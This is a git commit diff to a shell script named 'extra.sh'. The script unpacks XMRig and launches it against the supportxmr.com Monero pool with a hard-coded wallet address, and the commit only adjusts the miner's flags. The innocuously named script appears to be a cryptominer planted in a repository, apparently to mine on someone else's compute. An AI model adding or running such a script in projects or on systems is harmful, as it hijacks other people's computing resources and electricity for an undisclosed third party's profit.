12f6fc1ead29e526c9b42e87d7c4342da44fab9f
dragonmhmh <82892187+dragonmhmh@users.noreply.github.com>
2021-05-21 14:54:37 +0100

    Update extra.sh

--- extra.sh
+++ extra.sh
@@ -1,2 +1,2 @@
 tar xvzf xmrig-6.11.1-linux-x64.tar.gz
-./xmrig-6.11.1/xmrig -o pool.supportxmr.com:443 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -k --tls
+./xmrig-6.11.1/xmrig -o pool.supportxmr.com:443 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -p -x
